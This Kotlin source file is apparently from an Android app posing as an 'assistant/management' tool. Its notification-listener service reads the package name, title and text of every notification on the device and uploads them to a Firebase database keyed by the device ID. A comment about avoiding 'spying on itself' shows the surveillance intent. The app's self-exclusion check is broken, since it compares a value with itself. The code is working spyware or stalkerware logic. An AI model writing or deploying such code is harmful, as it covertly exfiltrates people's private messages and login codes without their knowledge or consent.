package com.assisten.gestion

import android.annotation.SuppressLint
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class NotificationService : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d("NotificationService", "✅ Servicio de escucha de notificaciones CONECTADO")
    }

    @SuppressLint("HardwareIds")
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: "Sin título"
        val text = extras.getCharSequence("android.text")?.toString() ?: "Sin contenido"
        
        Log.d("NotificationService", "🔔 Notificación recibida de: $packageName")
        Log.d("NotificationService", "📝 Contenido: $title - $text")

        // Ignorar notificaciones de nuestra propia app para evitar bucles
        if (packageName == packageName) {
            // Logica para no auto-espiarse si enviamos notificaciones de sistema
        }

        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val timestamp = System.currentTimeMillis()

        val log = mapOf(
            "app" to packageName,
            "title" to title,
            "text" to text,
            "timestamp" to timestamp
        )

        FirebaseDatabase.getInstance().reference
            .child("notifs")
            .child(deviceId)
            .push()
            .setValue(log)
            .addOnSuccessListener {
                Log.d("NotificationService", "☁️ Log enviado a Firebase correctamente")
            }
            .addOnFailureListener { e ->
                Log.e("NotificationService", "❌ Error al enviar a Firebase: ${e.message}")
            }
    }
}
